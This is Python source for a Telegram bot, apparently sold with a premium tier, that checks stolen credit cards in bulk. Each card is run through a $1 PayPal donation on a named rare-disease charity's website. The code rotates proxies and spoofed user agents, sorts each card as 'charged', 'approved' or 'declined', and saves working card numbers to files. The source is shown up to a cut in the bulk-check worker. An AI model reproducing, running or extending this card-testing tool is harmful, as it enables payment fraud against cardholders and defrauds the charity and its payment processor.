import telebot, cloudscraper, base64, re, time, os, json, threading, hashlib, requests, random, datetime, queue, urllib3
urllib3.disable_warnings()
from requests_toolbelt.multipart.encoder import MultipartEncoder
from user_agent import generate_user_agent
from concurrent.futures import ThreadPoolExecutor

BOT_TOKEN = 'BOT_TOKEN' # Bot Token
ADMIN_ID = 12345678 # Admin ID
bot = telebot.TeleBot(BOT_TOKEN)

USERS_FILE = 'Data/users.txt'
PREMIUM_FILE = 'Data/premium.txt'
BANNED_FILE = 'Data/banned.txt'
STATS_FILE = 'stats.json'
CHARGED_FILE = 'Data/charged.txt'
APPROVED_FILE = 'Data/approved.txt'

FREE_LIMIT = 0
PREMIUM_LIMIT = 1000
MAX_RETRIES = 3

USE_PROXY = False
PROXY_FILE = "proxy.txt"

ACTIVE_JOBS = {}
ACTIVE_USERS_PP = {}
ACTIVE_USERS_MPP = {}
USER_ACTIVE_JOB = {}
STATS_LOCK = threading.Lock()

os.makedirs('Data', exist_ok=True)
for f in [USERS_FILE, PREMIUM_FILE, BANNED_FILE, APPROVED_FILE, CHARGED_FILE]:
    if not os.path.exists(f): open(f, 'w').close()
if not os.path.exists(STATS_FILE):
    with open(STATS_FILE, 'w') as f: json.dump({"charged": 0, "approved": 0, "total_users": 0, "premium_users": 0, "banned_users": 0}, f)

def expiry_checker():
    while True:
        try:
            if os.path.exists(PREMIUM_FILE):
                with open(PREMIUM_FILE, 'r') as f: lines = f.readlines()
                new_lines = []
                for line in lines:
                    if '|' in line:
                        parts = line.strip().split('|')
                        uid, exp = parts[0], float(parts[1])
                        if exp != 0 and time.time() > exp:
                            try: bot.send_message(int(uid), "[!] ð¡ð¼ðð¶ð°ð²: ð¬ð¼ðð¿ ð£ð¿ð²ðºð¶ððº ððð¯ðð°ð¿ð¶ð½ðð¶ð¼ð» ðµð®ð ð²ðð½ð¶ð¿ð²ð±. ð¥ð²ð»ð²ð ð»ð¼ð ðð¼ ð°ð¼ð»ðð¶ð»ðð² ð²ð»ð·ð¼ðð¶ð»ð´ ð²ðð°ð¹ððð¶ðð² ð³ð²ð®ððð¿ð²ð!")
                            except: pass
                            continue
                    new_lines.append(line)
                with open(PREMIUM_FILE, 'w') as f: f.writelines(new_lines)
            if os.path.exists(BANNED_FILE):
                with open(BANNED_FILE, 'r') as f: lines = f.readlines()
                new_lines = []
                for line in lines:
                    if '|' in line:
                        parts = line.strip().split('|')
                        uid, exp = parts[0], float(parts[1])
                        if exp != 0 and time.time() > exp:
                            try: bot.send_message(int(uid), "[!] ð¡ð¼ðð¶ð°ð²: ð¬ð¼ðð¿ ð¯ð®ð» ðµð®ð ð²ðð½ð¶ð¿ð²ð±! ð¬ð¼ð ð®ð¿ð² ð»ð¼ð ð³ð¿ð²ð² ðð¼ ððð² ððµð² ð¯ð¼ð ð®ð´ð®ð¶ð». ð£ð¹ð²ð®ðð² ð³ð¼ð¹ð¹ð¼ð ððµð² ð¿ðð¹ð²ð.")
                            except: pass
                            continue
                    new_lines.append(line)
                with open(BANNED_FILE, 'w') as f: f.writelines(new_lines)
        except Exception as e:
            print(f"[!] Expiry Checker Error: {e}")
        time.sleep(60)

threading.Thread(target=expiry_checker, daemon=True).start()

def get_stats():
    with STATS_LOCK:
        try:
            with open(STATS_FILE, 'r') as f: return json.load(f)
        except: return {"charged": 0, "approved": 0, "total_users": 0, "premium_users": 0, "banned_users": 0}

def save_stats(stats):
    with STATS_LOCK:
        try:
            with open(STATS_FILE, 'w') as f: json.dump(stats, f)
        except: pass

def save_unique_cc(filepath, cc, note):
    cc_num = cc.split('|')[0].strip()
    try:
        with open(filepath, 'r', encoding='utf-8') as f:
            if cc_num in f.read():
                return
    except FileNotFoundError:
        pass
    with open(filepath, 'a', encoding='utf-8') as f:
        f.write(f"{cc} - {note}\n")

def is_admin(user_id):
    return user_id == ADMIN_ID

def is_premium(user_id):
    with open(PREMIUM_FILE, 'r') as f:
        premiums = f.read().splitlines()
        for p in premiums:
            if str(user_id) in p:
                parts = p.split('|')
                if len(parts) > 1:
                    exp = float(parts[1])
                    if exp == 0 or time.time() < exp: return True
                else: return True
    return False

def is_banned(user_id):
    with open(BANNED_FILE, 'r') as f:
        bans = f.read().splitlines()
        for b in bans:
            if str(user_id) in b:
                parts = b.split('|')
                if len(parts) > 1:
                    exp = float(parts[1])
                    if exp == 0 or time.time() < exp: return True
                else: return True
    return False

def add_user(user_id):
    with open(USERS_FILE, 'r+') as f:
        users = f.read().splitlines()
        if str(user_id) not in users:
            f.write(str(user_id) + '\n')
            s = get_stats()
            s["total_users"] = len(users) + 1
            save_stats(s)

proxy_list = []
PROXY_QUEUE = queue.Queue()

if USE_PROXY and os.path.exists(PROXY_FILE):
    with open(PROXY_FILE, 'r') as f:
        lines = [line.strip() for line in f if line.strip()]
        proxy_list = lines
        for p in lines:
            PROXY_QUEUE.put(p)

def format_proxy(proxy_str):
    proxy_str = proxy_str.strip()
    if not proxy_str: return None
    if '@' in proxy_str: return proxy_str
    parts = proxy_str.split(':')
    if len(parts) == 4:
        return f"{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    return proxy_str

def get_proxy_dict():
    if PROXY_QUEUE.empty(): return None, None
    p = PROXY_QUEUE.get()
    fp = format_proxy(p)
    proxy_dict = None
    if not any(p.startswith(proto) for proto in ['http', 'socks']):
        proxy_dict = {"http": f"http://{fp}", "https": f"http://{fp}"}
    else:
        proxy_dict = {"http": fp, "https": fp}
    return proxy_dict, p

def release_proxy(p):
    if p: PROXY_QUEUE.put(p)

def get_bin_info(bin_code):
    try:
        res = requests.get(f"https://bins.antipublic.cc/bins/{bin_code}", timeout=10)
        if res.status_code == 200:
            data = res.json()
            bank = data.get('bank', 'UNKNOWN')
            country = data.get('country_name', 'UNKNOWN')
            brand = data.get('brand', 'UNKNOWN')
            level = data.get('level', 'N/A')
            type_cc = data.get('type', 'N/A')
            return brand, bank, country, level, type_cc
    except: pass
    return "UNKNOWN", "UNKNOWN", "UNKNOWN", "N/A", "N/A"

def fmt(code):
    return str(code)

def check_cc(ccx, proxy=None):
    try:
        ccx = ccx.strip()
        parts = ccx.split("|")
        if len(parts) < 4:
            return "ERROR", "Invalid Format"
       
        n, mm, yy, cvc = parts[0], parts[1].zfill(2), parts[2][-2:], parts[3].strip()
        
        us = generate_user_agent()
        user = generate_user_agent()
        
        session = requests.Session()
        session.verify = False
        if proxy:
            session.proxies.update(proxy)
            
        adapter = requests.adapters.HTTPAdapter(pool_connections=100, pool_maxsize=100)
        session.mount('http://', adapter)
        session.mount('https://', adapter)
            
        with session as r:
            headers_get = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'en-US,en;q=0.9',
                'cache-control': 'max-age=0',
                'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'none',
                'upgrade-insecure-requests': '1',
                'user-agent': us,
            }
            
            response = r.get('https://www.rarediseasesinternational.org/donate/', headers=headers_get, timeout=30)
            
            if 'cf-ray' in response.headers or 'Cloudflare' in response.text or response.status_code == 403:
                return "ERROR", "Cloudflare Block"
            
            m1 = re.search(r'name="give-form-id-prefix" value="(.*?)"', response.text)
            m2 = re.search(r'name="give-form-id" value="(.*?)"', response.text)
            m3 = re.search(r'name="give-form-hash" value="(.*?)"', response.text)
            m4 = re.search(r'"data-client-token":"(.*?)"', response.text)
            
            if not all([m1, m2, m3, m4]):
                return "ERROR", "Page Load Error"
            
            id_form1 = m1.group(1)
            id_form2 = m2.group(1)
            nonec = m3.group(1)
            enc = m4.group(1)
            
            dec = base64.b64decode(enc).decode('utf-8')
            m_au = re.search(r'"accessToken":"(.*?)"', dec)
            if not m_au:
                return "ERROR", "Token Error"
            au = m_au.group(1)
            
            headers_post = {
                'origin': 'https://www.rarediseasesinternational.org/donate/',
                'referer': 'https://www.rarediseasesinternational.org/donate/',
                'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': us,
                'x-requested-with': 'XMLHttpRequest',
            }
            
            data_post = {
                'give-honeypot': '',
                'give-form-id-prefix': id_form1,
                'give-form-id': id_form2,
                'give-form-title': '',
                'give-current-url': 'https://www.rarediseasesinternational.org/donate/',
                'give-form-url': 'https://www.rarediseasesinternational.org/donate/',
                'give-form-minimum': '1',
                'give-form-maximum': '999999.99',
                'give-form-hash': nonec,
                'give-price-id': '3',
                'give-recurring-logged-in-only': '',
                'give-logged-in-only': '1',
                '_give_is_donation_recurring': '0',
                'give_recurring_donation_details': '{"give_recurring_option":"yes_donor"}',
                'give-amount': '1',
                'give_stripe_payment_method': '',
                'payment-mode': 'paypal-commerce',
                'give_first': 'xunarch',
                'give_last': 'xunarch',
                'give_email': 'xunarch@gmail.com',
                'card_name': 'xunarch',
                'card_exp_month': '',
                'card_exp_year': '',
                'give_action': 'purchase',
                'give-gateway': 'paypal-commerce',
                'action': 'give_process_donation',
                'give_ajax': 'true',
            }
            
            r.post('https://www.rarediseasesinternational.org/wp-admin/admin-ajax.php', headers=headers_post, data=data_post, timeout=30)
            
            data_multipart = MultipartEncoder({
                'give-honeypot': (None, ''),
                'give-form-id-prefix': (None, id_form1),
                'give-form-id': (None, id_form2),
                'give-form-title': (None, ''),
                'give-current-url': (None, 'https://www.rarediseasesinternational.org/donate/'),
                'give-form-url': (None, 'https://www.rarediseasesinternational.org/donate/'),
                'give-form-minimum': (None, '1'),
                'give-form-maximum': (None, '999999.99'),
                'give-form-hash': (None, nonec),
                'give-price-id': (None, '3'),
                'give-recurring-logged-in-only': (None, ''),
                'give-logged-in-only': (None, '1'),
                '_give_is_donation_recurring': (None, '0'),
                'give_recurring_donation_details': (None, '{"give_recurring_option":"yes_donor"}'),
                'give-amount': (None, '1'),
                'give_stripe_payment_method': (None, ''),
                'payment-mode': (None, 'paypal-commerce'),
                'give_first': (None, 'xunarch'),
                'give_last': (None, 'xunarch'),
                'give_email': (None, 'xunarch@gmail.com'),
                'card_name': (None, 'xunarch'),
                'card_exp_month': (None, ''),
                'card_exp_year': (None, ''),
                'give-gateway': (None, 'paypal-commerce'),
            })
            
            headers_multipart = {
                'content-type': data_multipart.content_type,
                'origin': 'https://www.rarediseasesinternational.org/donate/',
                'referer': 'https://www.rarediseasesinternational.org/donate/',
                'user-agent': us,
            }
            
            params = {'action': 'give_paypal_commerce_create_order'}
            response = r.post('https://www.rarediseasesinternational.org/wp-admin/admin-ajax.php', params=params, headers=headers_multipart, data=data_multipart, timeout=30)
            tok = response.json()['data']['id']
            
            headers_paypal = {
                'authority': 'cors.api.paypal.com',
                'accept': '*/*',
                'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en-US;q=0.7,en;q=0.6',
                'authorization': f'Bearer {au}',
                'braintree-sdk-version': '3.32.0-payments-sdk-dev',
                'content-type': 'application/json',
                'origin': 'https://assets.braintreegateway.com',
                'paypal-client-metadata-id': '7d9928a1f3f1fbc240cfd71a3eefe835',
                'referer': 'https://assets.braintreegateway.com/',
                'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': user,
            }
            
            json_data_paypal = {
                'payment_source': {
                    'card': {
                        'number': n,
                        'expiry': f'20{yy}-{mm}',
                        'security_code': cvc,
                        'attributes': {
                            'verification': {
                                'method': 'SCA_WHEN_REQUIRED',
                            },
                        },
                    },
                },
                'application_context': {
                    'vault': False,
                },
            }
            
            r.post(f'https://cors.api.paypal.com/v2/checkout/orders/{tok}/confirm-payment-source', headers=headers_paypal, json=json_data_paypal, timeout=30, verify=False)
            
            data_approve = MultipartEncoder({
                'give-honeypot': (None, ''),
                'give-form-id-prefix': (None, id_form1),
                'give-form-id': (None, id_form2),
                'give-form-title': (None, ''),
                'give-current-url': (None, 'https://www.rarediseasesinternational.org/donate/'),
                'give-form-url': (None, 'https://www.rarediseasesinternational.org/donate/'),
                'give-form-minimum': (None, '1'),
                'give-form-maximum': (None, '999999.99'),
                'give-form-hash': (None, nonec),
                'give-price-id': (None, '3'),
                'give-recurring-logged-in-only': (None, ''),
                'give-logged-in-only': (None, '1'),
                '_give_is_donation_recurring': (None, '0'),
                'give_recurring_donation_details': (None, '{"give_recurring_option":"yes_donor"}'),
                'give-amount': (None, '1'),
                'give_stripe_payment_method': (None, ''),
                'payment-mode': (None, 'paypal-commerce'),
                'give_first': (None, 'xunarch'),
                'give_last': (None, 'xunarch'),
                'give_email': (None, 'xunarch@gmail.com'),
                'card_name': (None, 'xunarch'),
                'card_exp_month': (None, ''),
                'card_exp_year': (None, ''),
                'give-gateway': (None, 'paypal-commerce'),
            })
            
            headers_approve = {
                'content-type': data_approve.content_type,
                'origin': 'https://www.rarediseasesinternational.org/donate/',
                'referer': 'https://www.rarediseasesinternational.org/donate/',
                'user-agent': us,
            }
            
            params = {'action': 'give_paypal_commerce_approve_order', 'order': tok}
            response = r.post('https://www.rarediseasesinternational.org/wp-admin/admin-ajax.php', params=params, headers=headers_approve, data=data_approve, timeout=30, verify=False)
            
            text = response.text
            text_up = text.upper()
            # Charged
            if any(k in text_up for k in ['APPROVESTATE":"APPROVED', 'PARENTTYPE":"AUTH', 'APPROVEGUESTPAYMENTWITHCREDITCARD', 'ADD_SHIPPING_ERROR', 'THANK YOU FOR DONATION', 'YOUR PAYMENT HAS ALREADY BEEN PROCESSED', 'THANKS', '"SUCCESS":TRUE']):
                if '"ERRORS"' not in text_up and '"ERROR"' not in text_up:
                    return "CHARGED", "Thank you for donation"
            # Approved
            if 'INSUFFICIENT_FUNDS' in text_up:
                return "APPROVED", "INSUFFICIENT_FUNDS"
            elif 'CVV2_FAILURE' in text_up:
                return "APPROVED", "CVV2_FAILURE"
            elif 'INVALID_SECURITY_CODE' in text_up:
                return "APPROVED", "INVALID_SECURITY_CODE"
            elif 'INVALID_BILLING_ADDRESS' in text_up:
                return "APPROVED", "INVALID_BILLING_ADDRESS"
            elif 'EXISTING_ACCOUNT_RESTRICTED' in text_up or 'ACCOUNT RESTRICTED' in text_up:
                return "APPROVED", "EXISTING_ACCOUNT_RESTRICTED"
            elif 'IS3SECUREREQUIRED' in text_up or 'OTP' in text_up:
                return "APPROVED", "3D_REQUIRED"
            # Declined
            elif 'DO_NOT_HONOR' in text_up:
                return "DECLINED", "Do not honor"
            elif 'ACCOUNT_CLOSED' in text_up:
                return "DECLINED", "Account closed"
            elif 'PAYER_ACCOUNT_LOCKED_OR_CLOSED' in text_up:
                return "DECLINED", "Account closed"
            elif 'LOST_OR_STOLEN' in text_up:
                return "DECLINED", "LOST OR STOLEN"
            elif 'SUSPECTED_FRAUD' in text_up:
                return "DECLINED", "SUSPECTED FRAUD"
            elif 'INVALID_ACCOUNT' in text_up:
                return "DECLINED", "INVALID_ACCOUNT"
            elif 'REATTEMPT_NOT_PERMITTED' in text_up:
                return "DECLINED", "REATTEMPT NOT PERMITTED"
            elif 'ACCOUNT_BLOCKED_BY_ISSUER' in text_up:
                return "DECLINED", "ACCOUNT_BLOCKED_BY_ISSUER"
            elif 'ORDER_NOT_APPROVED' in text_up:
                return "DECLINED", "ORDER_NOT_APPROVED"
            elif 'PICKUP_CARD_SPECIAL_CONDITIONS' in text_up:
                return "DECLINED", "PICKUP_CARD_SPECIAL_CONDITIONS"
            elif 'PAYER_CANNOT_PAY' in text_up:
                return "DECLINED", "PAYER CANNOT PAY"
            elif 'GENERIC_DECLINE' in text_up:
                return "DECLINED", "GENERIC_DECLINE"
            elif 'COMPLIANCE_VIOLATION' in text_up:
                return "DECLINED", "COMPLIANCE VIOLATION"
            elif 'TRANSACTION_NOT_PERMITTED' in text_up:
                return "DECLINED", "TRANSACTION NOT PERMITTED"
            elif 'PAYMENT_DENIED' in text_up:
                return "DECLINED", "PAYMENT_DENIED"
            elif 'INVALID_TRANSACTION' in text_up:
                return "DECLINED", "INVALID TRANSACTION"
            elif 'RESTRICTED_OR_INACTIVE_ACCOUNT' in text_up:
                return "DECLINED", "RESTRICTED OR INACTIVE ACCOUNT"
            elif 'SECURITY_VIOLATION' in text_up:
                return "DECLINED", "SECURITY_VIOLATION"
            elif 'DECLINED_DUE_TO_UPDATED_ACCOUNT' in text_up:
                return "DECLINED", "DECLINED DUE TO UPDATED ACCOUNT"
            elif 'INVALID_OR_RESTRICTED_CARD' in text_up:
                return "DECLINED", "INVALID CARD"
            elif 'EXPIRED_CARD' in text_up:
                return "DECLINED", "EXPIRED CARD"
            elif 'CRYPTOGRAPHIC_FAILURE' in text_up:
                return "DECLINED", "CRYPTOGRAPHIC FAILURE"
            elif 'TRANSACTION_CANNOT_BE_COMPLETED' in text_up:
                return "DECLINED", "TRANSACTION CANNOT BE COMPLETED"
            elif 'DECLINED_PLEASE_RETRY' in text_up:
                return "DECLINED", "DECLINED PLEASE RETRY LATER"
            elif 'TX_ATTEMPTS_EXCEED_LIMIT' in text_up:
                return "DECLINED", "EXCEED LIMIT"
            
            else:
                try:
                    res_json = response.json()
                    err = res_json.get('data', {}).get('error', 'Transaction Failed')
                    return "DECLINED", str(err)
                except:
                    return "DECLINED", "Transaction Failed"
                    
    # Error
    except Exception as e:
        msg = str(e)
        if "Read timed out" in msg or "timeout" in msg.lower(): return "ERROR", "Read Timeout"
        if "ProxyError" in msg or "HTTPSConnectionPool" in msg: return "ERROR", "Proxy/Connection Fail"
        return "ERROR", f"Req Error: {msg[:30]}"

@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.from_user.id
    if is_banned(user_id):
        bot.reply_to(message, "ð¬ð¼ð ð®ð¿ð² ðð®ð»ð»ð²ð± ð³ð¿ð¼ðº ððð¶ð»ð´ ððµð¶ð ð¯ð¼ð!")
        return
    add_user(user_id)
    fname = message.from_user.first_name

    if is_admin(user_id):
        menu = f"""ðð²ð¹ð¹ð¼ {fname}! ðªð²ð¹ð°ð¼ðºð² ðð¼ ð£ð®ðð½ð®ð¹ ð­$ ððµð²ð°ð¸ð²ð¿.

â¬ ð¨ðð²ð¿ ððºð±ð:
/pp <cc|mm|yy|cvv> - ð¦ð¶ð»ð´ð¹ð² ððµð²ð°ð¸
/mpp (reply to file) - ð ð®ðð ððµð²ð°ð¸
/stop - ð¦ðð¼ð½ ð ð®ðð ðð¼ð¯
/info <userid> - ð¨ðð²ð¿ ðð»ð³ð¼

â¬ ðð±ðºð¶ð» ððºð±ð:
/addpremium <userid> <duration> - ðð±ð± ð£ð¿ð²ðºð¶ððº
/rmpremium <userid> - ð¥ð²ðºð¼ðð² ð£ð¿ð²ðºð¶ððº
/ban <userid> <duration> - ðð®ð» ð¨ðð²ð¿
/unban <userid> - ð¨ð»ð¯ð®ð» ð¨ðð²ð¿
/stats - ðð¼ð ð¦ðð®ðð
/broadcast <msg> - ðð¿ð¼ð®ð±ð°ð®ðð


â¬ ððð¯ â¬ @Xoarch"""
    elif is_premium(user_id):
        menu = f"""ðð²ð¹ð¹ð¼ {fname}! ðªð²ð¹ð°ð¼ðºð² ðð¼ ð£ð®ðð½ð®ð¹ ð­$ ððµð²ð°ð¸ð²ð¿.

â¬ ððºð±ð:
/pp <cc|mm|yy|cvv> - ð¦ð¶ð»ð´ð¹ð² ððµð²ð°ð¸
/mpp (reply to file) - ð ð®ðð ððµð²ð°ð¸
/stop - ð¦ðð¼ð½ ð ð®ðð ðð¼ð¯
/info - ð ð ðð»ð³ð¼

â¬ ððð¯ â¬ @Xoarch"""
    else:
        if FREE_LIMIT == 0:
            menu = f"""ðð²ð¹ð¹ð¼ {fname}! ðªð²ð¹ð°ð¼ðºð² ðð¼ ð£ð®ðð½ð®ð¹ ð­$ ððµð²ð°ð¸ð²ð¿.

â¬ ððºð±ð:
/pp <cc|mm|yy|cvv> - ð¦ð¶ð»ð´ð¹ð² ððµð²ð°ð¸
/mpp - ð ð®ðð ððµð²ð°ð¸ (ð£ð¿ð²ðºð¶ððº ð¢ð»ð¹ð)
/stop - ð¦ðð¼ð½ ð ð®ðð ðð¼ð¯
/info - ð ð ðð»ð³ð¼

â¬ ððð¯ â¬ @Xoarch"""
        else:
            menu = f"""ðð²ð¹ð¹ð¼ {fname}! ðªð²ð¹ð°ð¼ðºð² ðð¼ ð£ð®ðð½ð®ð¹ ð­$ ððµð²ð°ð¸ð²ð¿.

â¬ ððºð±ð:
/pp <cc|mm|yy|cvv> - ð¦ð¶ð»ð´ð¹ð² ððµð²ð°ð¸
/mpp (reply to file) - ð ð®ðð ððµð²ð°ð¸
/stop - ð¦ðð¼ð½ ð ð®ðð ðð¼ð¯
/info - ð ð ðð»ð³ð¼

â¬ ððð¯ â¬ @Xoarch"""

    bot.reply_to(message, menu)


@bot.message_handler(commands=['pp'])
def pp(message):
    user_id = message.from_user.id
    if is_banned(user_id):
        bot.reply_to(message, "ð¬ð¼ð ð®ð¿ð² ðð®ð»ð»ð²ð± ð³ð¿ð¼ðº ððð¶ð»ð´ ððµð¶ð ð¯ð¼ð!")
        return
    add_user(user_id)

    if ACTIVE_USERS_PP.get(user_id):
        bot.reply_to(message, "[â] ð¬ð¼ð ð®ð¹ð¿ð²ð®ð±ð ðµð®ðð² ð® ðð¶ð»ð´ð¹ð² ð°ðµð²ð°ð¸ ð¿ðð»ð»ð¶ð»ð´! ð£ð¹ð²ð®ðð² ðð®ð¶ð.")
        return
        
    try:
        cc = message.text.split()[1]
        if len(cc.split('|')) < 4:
            raise ValueError
    except (IndexError, ValueError):
        bot.reply_to(message, "[â] ðð»ðð®ð¹ð¶ð± ðð®ð¿ð± ðð¼ð¿ðºð®ð! ð¨ðð²: ð°ð­ð­ð­|ð¬ð°|ð®ð²|ð­ð®ð¯")
        return
    
    ACTIVE_USERS_PP[user_id] = True
    msg = bot.reply_to(message, "ðð«ð¨ððð¬ð¬ð¢ð§ð  ð²ð¨ð®ð« ð«ððªð®ðð¬ð­...")
    
    status, response = "ERROR", "N/A"
    for _ in range(MAX_RETRIES):
        proxy_dict = None
        p_raw = None
        if USE_PROXY:
            proxy_dict, p_raw = get_proxy_dict()
            
        try:
            status, response = check_cc(cc, proxy_dict)
        finally:
            if USE_PROXY: release_proxy(p_raw)
            
        if status != "ERROR": break
        
    response = fmt(response)
        
    bin_code = cc[:6]
    brand, bank, country, level, type_cc = get_bin_info(bin_code)
    
    status_font = "ðð¡ðð«ð ðð ð¥" if status == "CHARGED" else "ðð©ð©ð«ð¨ð¯ðð â" if status == "APPROVED" else "ðððð¥ð¢ð§ðð" if status == "DECLINED" else "ðð«ð«ð¨ð«"
    
    if status == "CHARGED":
        s = get_stats(); s["charged"] += 1; save_stats(s)
        os.makedirs('Data', exist_ok=True)
        save_unique_cc('Data/charged.txt', cc, response)
    elif status == "APPROVED":
        s = get_stats(); s["approved"] += 1; save_stats(s)
        os.makedirs('Data', exist_ok=True)
        save_unique_cc('Data/approved.txt', cc, response)

    if is_admin(user_id): is_p = " [ððð ðð¡]"
    elif is_premium(user_id): is_p = " [ð£ð¥ðð ðð¨ð ]"
    else: is_p = " [ðð¥ðð]"
    
    safe_fname = str(message.from_user.first_name).replace("<", "").replace(">", "").replace("&", "")
    safe_bank = str(bank).replace("<", "").replace(">", "").replace("&", "")
    safe_brand = str(brand).replace("<", "").replace(">", "").replace("&", "")
    
    res = f"""
ððð«ð â <code>{cc}</code>
ðð­ðð­ð®ð¬ â {status_font}
ððð¬ð©ð¨ð§ð¬ð â <code>{response}</code>
ððð­ðð°ðð² â ððð²ð©ðð¥ ð$
âââââââââââ
ðð§ðð¨ â {safe_brand} - {type_cc} - {level}
ððð§ð¤ â {safe_bank}
ðð¨ð®ð§ð­ð«ð² â {country}
âââââââââââ
ðð¡ððð¤ðð ðð² â {safe_fname}{is_p}
â¬ ððð¯ â¬ @Xoarch
"""
    try: bot.edit_message_text(res, message.chat.id, msg.message_id, parse_mode="HTML")
    except Exception as e:
        print("[!] Final Msg Edit HTML error: ", e)
        try: bot.edit_message_text(res.replace("<code>", "").replace("</code>", ""), message.chat.id, msg.message_id)
        except:
            try: bot.reply_to(message, res, parse_mode="HTML")
            except: pass
        
    ACTIVE_USERS_PP[user_id] = False

@bot.message_handler(commands=['mpp'])
def mpp(message):
    user_id = message.from_user.id
    if is_banned(user_id):
        bot.reply_to(message, "ð¬ð¼ð ð®ð¿ð² ðð®ð»ð»ð²ð± ð³ð¿ð¼ðº ððð¶ð»ð´ ððµð¶ð ð¯ð¼ð!")
        return
    add_user(user_id)
    
    if ACTIVE_USERS_MPP.get(user_id):
        bot.reply_to(message, "[â] ð¬ð¼ð ð®ð¹ð¿ð²ð®ð±ð ðµð®ðð² ð® ðºð®ðð ð°ðµð²ð°ð¸ ð¿ðð»ð»ð¶ð»ð´! ð£ð¹ð²ð®ðð² /ððð¼ð½ ð¶ð ð³ð¶ð¿ðð.")
        return
    
    if not message.reply_to_message or not message.reply_to_message.document:
        bot.reply_to(message, "ð£ð¹ð²ð®ðð² ð¿ð²ð½ð¹ð ðð¼ ð® .ððð ð³ð¶ð¹ð² ðð¶ððµ /mpp")
        return
    
    file_info = bot.get_file(message.reply_to_message.document.file_id)
    downloaded_file = bot.download_file(file_info.file_path)
    ccs = downloaded_file.decode('utf-8').splitlines()
    ccs = list(dict.fromkeys([l.strip() for l in ccs if l.strip()]))
    
    is_p = is_premium(user_id)
    limit = PREMIUM_LIMIT if is_p or is_admin(user_id) else FREE_LIMIT
    
    if limit == 0:
        was_premium = False
        with open(PREMIUM_FILE, 'r') as f:
            for line in f:
                if str(user_id) in line: was_premium = True; break

        if was_premium:
            bot.reply_to(message, "[â] ð£ð¿ð²ðºð¶ððº ð¢ð»ð¹ð! ð¬ð¼ðð¿ ð£ð¿ð²ðºð¶ððº ðµð®ð ð²ðð½ð¶ð¿ð²ð±. ðð¼ð»ðð®ð°ð ð®ð±ðºð¶ð» ðð¼ ð¿ð²ð»ð²ð.")
        else:
            bot.reply_to(message, "[â] ð£ð¿ð²ðºð¶ððº ð¢ð»ð¹ð! ð¨ð½ð´ð¿ð®ð±ð² ðð¼ ð£ð¿ð²ðºð¶ððº ðð¼ ððð² ð ð®ðð ððµð²ð°ð¸.")
        return
        
    total_found = len(ccs)
    
    if total_found > limit:
        bot.reply_to(message, f"[!] ðð¤ðªð£ð {total_found} ð¾ð¾ð¨ ðð£ ððð¡ð\nðð§ð¤ððð¨ð¨ðð£ð ð¤ð£ð¡ð® ððð§ð¨ð© {limit} ð¾ð¾ð¨ (ð®ð¤ðªð§ ð¡ðð¢ðð©)\n{limit} ð¾ð¾ð¨ ð¬ðð¡ð¡ ðð ððððð ðð")
        ccs = ccs[:limit]
    
    job_id = hashlib.md5(str(time.time()).encode()).hexdigest()[:8].upper()
    ACTIVE_JOBS[job_id] = True
    ACTIVE_USERS_MPP[user_id] = True
    USER_ACTIVE_JOB[user_id] = job_id
    total = len(ccs)
    if is_admin(user_id): is_p = " [ððð ðð¡]"
    elif is_premium(user_id): is_p = " [ð£ð¥ðð ðð¨ð ]"
    else: is_p = " [ðð¥ðð]"
    initial_text = f"ð£ð®ðð½ð®ð¹ððµð¸ ðð¼ð¯: {job_id} / ð£ð®ðð½ð®ð¹ â ð¥ðð»ð»ð¶ð»ð´\n\n[â¡â¡â¡â¡â¡â¡â¡â¡â¡â¡] (0.0%)\n\nð§ð®ðð¸       - ð£ð®ðð½ð®ð¹ ð­$\nð§ð¼ðð®ð¹      - {total}\nð£ð¿ð¼ð°ð²ððð²ð±  - 0/{total}\nððµð®ð¿ð´ð²ð±    - 0\nðð½ð½ð¿ð¼ðð²ð±   - 0\nðð²ð°ð¹ð¶ð»ð²ð±   - 0\nðð¿ð¿ð¼ð¿ð     - 0\nð§/ð§        - 0ð\nð¨ðð²ð¿       - {message.from_user.first_name}{is_p}\n\nð¦ð²ððð¶ð¼ð» ð¥ðð»ð»ð¶ð»ð´.\n\nðð²ð - @Xoarch"
    prog_msg = bot.reply_to(message, initial_text)
    
    results = {"charged": 0, "approved": 0, "declined": 0, "error": 0, "checked": 0}
    start_time = time.time()
    
    def worker(cc):
        if not ACTIVE_JOBS.get(job_id): return
        
        status, response = "ERROR", "N/A"
        for _ in range(3):
            proxy_dict = None
            p_raw = None
            if USE_PROXY:
                proxy_dict, p_raw = get_proxy_dict()
                
            try:
                status, response = check_cc(cc, proxy_dict)
            finally:
                time.sleep(1.5)
                if USE_PROXY: release_proxy(p_raw)
                
            if status != "ERROR" and response not in ["Proxy/Connection Fail", "Read Timeout", "Cloudflare Block"]:
                break
                
            print(f"[!] Retry triggered on {cc} | Status: {status} | Error: {response}")
            time.sleep(2)
            
        response = fmt(response)
            
        if status == "CHARGED": results["charged"] += 1
        elif status == "APPROVED": results["approved"] += 1
        elif status == "DECLINED": results["declined"] += 1
        else: results["error"] += 1
        results["checked"] += 1
        
        if status in ["CHARGED", "APPROVED"]:
            os.makedirs('Data', exist_ok=True)
            if status == "CHARGED":
                try: s = get_stats(); s["charged"] += 1; save_stats(s)
                except: pass
                save_unique_cc('Data/charged.txt', cc, response)
            elif status == "APPROVED":
                try: s = get_stats(); s["approved"] += 1; save_stats(s)
                except: pass
                save_unique_cc('Data/approved.txt', cc, response)

            bin_code = cc[:6]
            brand, bank, country, level, type_cc = get_bin_info(bin_code)
            if is_admin(user_id): is_p = " [ððð ðð¡]"
